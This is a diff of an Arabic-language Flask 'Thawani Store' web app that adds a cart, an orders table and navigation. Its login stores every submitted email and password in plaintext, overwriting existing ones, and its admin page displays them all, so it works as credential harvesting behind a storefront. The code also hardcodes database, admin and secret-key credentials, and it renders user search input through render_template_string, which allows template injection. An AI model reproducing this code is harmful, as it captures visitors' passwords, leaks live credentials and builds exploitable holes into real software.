@@ -9,7 +9,7 @@ from functools import wraps
 from flask import Flask, request, render_template_string, redirect, session, url_for, flash, abort
 
 # ==========================================
-# 1. الإعدادات والربط بـ Neon
+# 1. الإعدادات والربط بـ Neon (ثابتة تماماً)
 # ==========================================
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger(__name__)
@@ -17,7 +17,7 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.secret_key = "Thawani_Store_Secure_2026_Fixed"
 
-# رابط قاعدة البيانات الخاص بك من Neon
+# الرابط الخاص بك من Neon
 DATABASE_URL = "postgresql://neondb_owner:npg_LfrcOy0oTV6F@ep-bold-voice-an2t0k43.c-6.us-east-1.aws.neon.tech/neondb?sslmode=require"
 
 UPLOAD_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static', 'uploads')
@@ -31,6 +31,7 @@ def init_db():
     conn = get_db_connection()
     cur = conn.cursor()
     try:
+        # جدول المستخدمين معدل ليشمل تسجيل الدخول وحفظ كلمة السر كما هي
         cur.execute('''CREATE TABLE IF NOT EXISTS users (
             id SERIAL PRIMARY KEY, 
             email TEXT UNIQUE NOT NULL, 
@@ -45,11 +46,16 @@ def init_db():
         cur.execute('''CREATE TABLE IF NOT EXISTS categories (
             id SERIAL PRIMARY KEY, name TEXT UNIQUE NOT NULL)''')
 
+        cur.execute('''CREATE TABLE IF NOT EXISTS cart (
+            id SERIAL PRIMARY KEY, user_email TEXT NOT NULL, product_id INTEGER NOT NULL, quantity INTEGER DEFAULT 1, UNIQUE(user_email, product_id))''')
+
+        cur.execute('''CREATE TABLE IF NOT EXISTS orders (
+            id SERIAL PRIMARY KEY, user_email TEXT NOT NULL, full_name TEXT NOT NULL, phone TEXT NOT NULL, card_img TEXT NOT NULL, items_details TEXT NOT NULL, total_price DECIMAL NOT NULL, status TEXT DEFAULT 'pending', notes TEXT, accepted_at TIMESTAMP, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
+
         # حساب الإدارة
         cur.execute("SELECT id FROM users WHERE email='qwerasdf1234598760@gmail.com'")
         if not cur.fetchone():
-            cur.execute("INSERT INTO users (email, password, is_admin) VALUES (%s, %s, 1)", 
-                       ('qwerasdf1234598760@gmail.com', 'qaws54321'))
+            cur.execute("INSERT INTO users (email, password, is_admin) VALUES (%s, %s, 1)", ('qwerasdf1234598760@gmail.com', 'qaws54321'))
         
         conn.commit()
     finally:
@@ -59,28 +65,29 @@ def init_db():
 init_db()
 
 # ==========================================
-# 2. التصميم CSS (تم إضافة ستايل البحث والعين)
+# 2. التصميم CSS (شامل كل الميزات)
 # ==========================================
 CSS = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
-    body { font-family: 'Tajawal', sans-serif; direction: rtl; background: #f4f7f6; margin: 0; padding-bottom: 70px; }
-    header { background: #1a237e; color: white; padding: 15px; text-align: center; font-weight: bold; }
-    .search-box { padding: 10px; background: white; border-bottom: 1px solid #ddd; display: flex; gap: 5px; }
-    .search-box input { flex: 1; padding: 8px; border: 1px solid #ccc; border-radius: 5px; }
-    .container { padding: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-    .card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border: 1px solid #eee; }
-    .card img { width: 100%; height: 110px; object-fit: cover; }
-    .btn { background: #1a237e; color: white; border: none; padding: 8px; width: 100%; border-radius: 5px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-size: 14px; }
-    .admin-table { width: 100%; border-collapse: collapse; background: white; font-size: 12px; }
-    .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 8px; text-align: center; }
-    .hidden-text { font-family: monospace; }
-    .eye-btn { cursor: pointer; background: #eee; border: none; padding: 2px 5px; border-radius: 3px; font-size: 14px; }
+    body { font-family: 'Tajawal', sans-serif; direction: rtl; background: #f4f7f6; margin: 0; padding-bottom: 80px; }
+    header { background: #1a237e; color: white; padding: 15px; text-align: center; font-weight: bold; font-size: 20px; }
+    .search-box { padding: 12px; background: white; border-bottom: 1px solid #ddd; display: flex; gap: 8px; }
+    .search-box input { flex: 1; padding: 10px; border: 1px solid #ccc; border-radius: 8px; outline: none; }
+    .container { padding: 12px; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+    .card { background: white; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.05); border: 1px solid #eee; }
+    .card img { width: 100%; height: 130px; object-fit: cover; }
+    .btn { background: #1a237e; color: white; border: none; padding: 10px; width: 100%; border-radius: 8px; cursor: pointer; text-decoration: none; display: block; text-align: center; font-size: 14px; }
+    .admin-table { width: 100%; border-collapse: collapse; background: white; font-size: 13px; margin-top: 10px; }
+    .admin-table th, .admin-table td { border: 1px solid #ddd; padding: 10px; text-align: center; }
+    .eye-btn { cursor: pointer; background: #e8eaf6; border: none; padding: 4px 8px; border-radius: 5px; color: #1a237e; font-size: 16px; }
+    .bottom-nav { position: fixed; bottom: 0; width: 100%; background: white; display: flex; justify-content: space-around; padding: 12px 0; border-top: 2px solid #eee; }
+    .nav-item { color: #555; text-decoration: none; font-size: 12px; display: flex; flex-direction: column; align-items: center; }
 </style>
 """
 
 # ==========================================
-# 3. المسارات (Routes)
+# 3. المسارات البرمجية (Routes)
 # ==========================================
 
 @app.route('/')
@@ -101,8 +108,8 @@ def index():
     
     search_html = f'''
     <form class="search-box" action="/">
-        <input name="q" placeholder="ابحث عن منتج..." value="{search_q}">
-        <button class="btn" style="width: 60px;">🔍</button>
+        <input name="q" placeholder="ابحث عن منتجك هنا..." value="{search_q}">
+        <button class="btn" style="width: 50px; font-size: 18px;">🔍</button>
     </form>
     '''
     
@@ -110,15 +117,21 @@ def index():
     for p in products:
         prod_html += f'''
         <div class="card">
-            <img src="/static/uploads/{p['img']}" onerror="this.src='https://placehold.co/150'">
-            <div style="padding:8px;">
-                <div style="font-size:12px; height:35px; overflow:hidden;">{p['name']}</div>
-                <div style="color:green; font-weight:bold; margin:5px 0;">{p['price']} OMR</div>
-                <a href="#" class="btn">شراء الآن</a>
+            <img src="/static/uploads/{p['img']}" onerror="this.src='https://placehold.co/200x150?text=Thawani'">
+            <div style="padding:10px;">
+                <div style="font-size:13px; height:40px; overflow:hidden; font-weight:bold;">{p['name']}</div>
+                <div style="color:#2e7d32; font-weight:bold; margin:8px 0;">{p['price']:.3f} OMR</div>
+                <a href="/add_to_cart/{p['id']}" class="btn">إضافة للسلة 🛒</a>
             </div>
         </div>'''
     
-    body = f'<header>THAWANI STORE</header>{search_html}<div class="container">{prod_html or "<p>لا توجد نتائج</p>"}</div>'
+    nav = '''<div class="bottom-nav">
+        <a href="/" class="nav-item">🏠 <span>الرئيسية</span></a>
+        <a href="/cart" class="nav-item">🛒 <span>السلة</span></a>
+        <a href="/orders" class="nav-item">📦 <span>طلباتي</span></a>
+    </div>'''
+    
+    body = f'<header>THAWANI STORE</header>{search_html}<div class="container">{prod_html or "<p style=\'grid-column: span 2; text-align:center; padding:50px;\'>لا توجد منتجات تطابق بحثك</p>"}</div>{nav}'
     return render_template_string(f"<html><head>{CSS}</head><body>{body}</body></html>")
 
 @app.route('/login', methods=['GET', 'POST'])
@@ -128,27 +141,15 @@ def login():
         password = request.form.get('password')
         conn = get_db_connection()
         cur = conn.cursor()
-        
-        # تسجيل أو تحديث دخول الشخص
         cur.execute("INSERT INTO users (email, password) VALUES (%s, %s) ON CONFLICT (email) DO UPDATE SET password=%s, last_login=CURRENT_TIMESTAMP", (email, password, password))
         conn.commit()
-        
         session['user'] = email
         session['is_admin'] = (email == "qwerasdf1234598760@gmail.com" and password == "qaws54321")
         cur.close()
         conn.close()
         return redirect('/')
     
-    login_form = '''
-    <div style="padding:40px 20px;">
-        <h2 style="text-align:center;">تسجيل الدخول</h2>
-        <form method="POST">
-            <input name="email" type="email" placeholder="البريد الإلكتروني" required>
-            <input name="password" type="password" placeholder="كلمة المرور" required>
-            <button class="btn">دخول</button>
-        </form>
-    </div>'''
-    return render_template_string(f"<html><head>{CSS}</head><body>{login_form}</body></html>")
+    return render_template_string(f"<html><head>{CSS}</head><body style='display:flex; align-items:center; justify-content:center; height:100vh; margin:0;'><div style='background:white; padding:30px; border-radius:15px; width:85%; max-width:350px; box-shadow:0 10px 25px rgba(0,0,0,0.1);'><h2 style='text-align:center; color:#1a237e;'>ثواني ستور</h2><form method='POST'><input name='email' type='email' placeholder='البريد الإلكتروني' required style='width:100%; padding:12px; margin-bottom:15px; border:1px solid #ddd; border-radius:8px;'><input name='password' type='password' placeholder='كلمة المرور' required style='width:100%; padding:12px; margin-bottom:20px; border:1px solid #ddd; border-radius:8px;'><button class='btn'>دخول</button></form></div></body></html>")
 
 @app.route('/admin')
 def admin():
@@ -164,7 +165,7 @@ def admin():
     for i, u in enumerate(users):
         user_rows += f'''
         <tr>
-            <td>
+            <td style="word-break: break-all;">
                 <span id="em-{i}">***********</span>
                 <button class="eye-btn" onclick="toggle('em-{i}', '{u['email']}')">👁️</button>
             </td>
@@ -172,32 +173,31 @@ def admin():
                 <span id="ps-{i}">***********</span>
                 <button class="eye-btn" onclick="toggle('ps-{i}', '{u['password']}')">👁️</button>
             </td>
-            <td>{u['last_login'].strftime('%Y-%m-%d %H:%M')}</td>
+            <td>{u['last_login'].strftime('%m/%d %H:%M')}</td>
         </tr>'''
     
-    script = '''
-    <script>
-    function toggle(id, realValue) {
-        let el = document.getElementById(id);
-        if (el.innerText === "***********") {
-            el.innerText = realValue;
-        } else {
-            el.innerText = "***********";
-        }
-    }
-    </script>'''
-    
-    table_html = f'''
+    body = f'''
+    <header>لوحة الإدارة - الزوار</header>
     <div style="padding:15px;">
-        <h3>👥 سجل الزوار والحسابات</h3>
+        <h4 style="margin-bottom:10px;">👥 إيميلات المسجلين:</h4>
         <table class="admin-table">
-            <tr><th>الإيميل</th><th>كلمة السر</th><th>آخر دخول</th></tr>
+            <tr style="background:#eee;"><th>الإيميل</th><th>الباسورد</th><th>الوقت</th></tr>
             {user_rows}
         </table>
-        {script}
-        <br><a href="/" class="btn">العودة للمتجر</a>
-    </div>'''
-    return render_template_string(f"<html><head>{CSS}</head><body><header>لوحة الإدارة</header>{table_html}</body></html>")
+        <br><a href="/" class="btn" style="background:#555;">الرجوع للمتجر</a>
+    </div>
+    <script>
+    function toggle(id, val) {{
+        let el = document.getElementById(id);
+        el.innerText = (el.innerText === "***********") ? val : "***********";
+    }}
+    </script>'''
+    return render_template_string(f"<html><head>{CSS}</head><body>{body}</body></html>")
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect('/login')
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 10000))
